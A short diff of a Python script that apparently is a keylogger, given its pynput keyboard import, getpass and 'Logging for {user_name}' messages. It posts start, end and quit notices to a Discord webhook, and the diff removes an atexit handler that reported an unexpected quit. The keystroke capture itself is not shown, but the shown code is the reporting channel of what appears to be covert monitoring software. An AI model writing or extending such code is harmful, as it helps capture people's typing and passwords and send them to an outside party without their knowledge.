@@ -4,7 +4,6 @@ import requests
 import threading
 import getpass
 import sys
-import atexit
 from pynput import keyboard
 import time
 
@@ -164,21 +163,6 @@ def send_end_message():
         print('End message sent successfully.')
     else:
         print(f'Failed to send end message. Status code: {response.status_code}')
-
-# Function to send the unexpected quit message to Discord
-def send_unexpected_quit_message():
-    quit_message = f"Logging for {user_name} quit unexpectedly"
-    data = {
-        "content": quit_message
-    }
-    response = requests.post(webhook_url, json=data)
-    if response.status_code == 204:
-        print('Unexpected quit message sent successfully.')
-    else:
-        print(f'Failed to send unexpected quit message. Status code: {response.status_code}')
-
-# Register the unexpected quit message to be sent on exit
-atexit.register(send_unexpected_quit_message)
 
 # Send the start message
 send_start_message()
